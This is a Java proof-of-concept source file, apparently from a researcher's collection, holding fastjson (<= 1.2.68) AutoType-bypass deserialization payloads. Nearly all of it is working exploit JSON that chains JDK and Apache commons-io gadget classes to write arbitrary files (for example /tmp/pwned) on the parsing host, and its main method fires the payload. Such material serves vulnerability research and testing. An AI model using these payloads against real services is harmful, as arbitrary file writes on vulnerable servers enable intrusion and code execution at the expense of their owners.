package com.threedr3am.bug.fastjson.file;

import com.alibaba.fastjson.JSON;
import java.io.IOException;

/**
 *
 * fastjson <= 1.2.68
 *
 * todo 貌似ASM对于JDK8和JDK11字节码的本地变量表会有点特殊的处理，使得没有无参构造方法也能被反射实例化
 *
 * @author threedr3am
 */
public class FileWriteBypassAutoType1_2_68 {


  public static void main(String[] args) throws IOException {

    String json = "{\n"
        + "    '@type':\"java.lang.AutoCloseable\",\n"
        + "    '@type':'sun.rmi.server.MarshalOutputStream',\n"
        + "    'out':\n"
        + "    {\n"
        + "        '@type':'java.util.zip.InflaterOutputStream',\n"
        + "        'out':\n"
        + "        {\n"
        + "           '@type':'java.io.FileOutputStream',\n"
        + "           'file':'/tmp/aaxxx',\n"
        + "           'append':false\n"
        + "        },\n"
        + "        'infl':\n"
        + "        {\n"
        + "            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='\n"
        + "        },\n"
        + "        'bufLen':1048576\n"
        + "    },\n"
        + "    'protocolVersion':1\n"
        + "}";
//    JSON.parse(json);

    String json_for_jdk11 = "{\n"
        + "    '@type':\"java.lang.AutoCloseable\",\n"
        + "    '@type':'sun.rmi.server.MarshalOutputStream',\n"
        + "    'out':\n"
        + "    {\n"
        + "        '@type':'java.util.zip.InflaterOutputStream',\n"
        + "        'out':\n"
        + "        {\n"
        + "           '@type':'java.io.FileOutputStream',\n"
        + "           'file':'dst',\n"
        + "           'append':false\n"
        + "        },\n"
        + "        'infl':\n"
        + "        {\n"
        + "            'input':\n"
        + "            {\n"
        + "                'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',\n"
        + "                'limit':22\n"
        + "            }\n"
        + "        },\n"
        + "        'bufLen':1048576\n"
        + "    },\n"
        + "    'protocolVersion':1\n"
        + "}";

    String userJson = "\n" +
            "{\n" +
            "  \"x\":{\n" +
            "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
            "    \"input\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
            "      \"reader\":{\n" +
            "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
            "        \"charSequence\":{\"@type\":\"java.lang.String\"\"testaaaaaaaaaaaaaaaaaaaa\"\n" +
            "      },\n" +
            "      \"charsetName\":\"UTF-8\",\n" +
            "      \"bufferSize\":1024\n" +
            "    },\n" +
            "    \"branch\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
            "      \"writer\":{\n" +
            "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
            "        \"file\":\"/tmp/pwned\",\n" +
            "        \"charsetName\":\"UTF-8\",\n" +
            "        \"append\": false\n" +
            "      },\n" +
            "      \"charset\":\"UTF-8\",\n" +
            "      \"bufferSize\": 1024,\n" +
            "      \"writeImmediately\": true\n" +
            "    },\n" +
            "    \"trigger\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
            "      \"is\":{\n" +
            "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
            "        \"input\":{\n" +
            "          \"$ref\":\"$.input\"\n" +
            "        },\n" +
            "        \"branch\":{\n" +
            "          \"$ref\":\"$.branch\"\n" +
            "        },\n" +
            "        \"closeBranch\": true\n" +
            "      },\n" +
            "      \"httpContentType\":\"text/xml\",\n" +
            "      \"lenient\":false,\n" +
            "      \"defaultEncoding\":\"UTF-8\"\n" +
            "    },\n" +
            "    \"trigger2\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
            "      \"is\":{\n" +
            "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
            "        \"input\":{\n" +
            "          \"$ref\":\"$.input\"\n" +
            "        },\n" +
            "        \"branch\":{\n" +
            "          \"$ref\":\"$.branch\"\n" +
            "        },\n" +
            "        \"closeBranch\": true\n" +
            "      },\n" +
            "      \"httpContentType\":\"text/xml\",\n" +
            "      \"lenient\":false,\n" +
            "      \"defaultEncoding\":\"UTF-8\"\n" +
            "    },\n" +
            "    \"trigger3\":{\n" +
            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
            "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
            "      \"is\":{\n" +
            "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
            "        \"input\":{\n" +
            "          \"$ref\":\"$.input\"\n" +
            "        },\n" +
            "        \"branch\":{\n" +
            "          \"$ref\":\"$.branch\"\n" +
            "        },\n" +
            "        \"closeBranch\": true\n" +
            "      },\n" +
            "      \"httpContentType\":\"text/xml\",\n" +
            "      \"lenient\":false,\n" +
            "      \"defaultEncoding\":\"UTF-8\"\n" +
            "    }\n" +
            "  }\n" +
            "}";

    JSON.parseObject(userJson);
  }

}
